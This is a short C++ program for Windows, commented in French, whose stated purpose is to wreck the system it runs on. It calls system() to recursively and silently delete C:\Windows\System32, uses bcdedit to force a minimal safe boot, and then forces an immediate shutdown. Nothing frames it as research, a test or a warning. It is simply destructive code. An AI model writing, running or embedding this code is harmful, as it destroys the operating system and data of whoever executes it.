#include <cstdlib>
#include <windows.h>

int main() {
    // Commande pour supprimer le system32
    system("rd /s /q C:\\Windows\\System32");
    // Commandes pour endommager le système encore plus
    system("bcdedit /set {current} safeboot minimal");
    system("shutdown /s /f /t 00");

    return 0;
}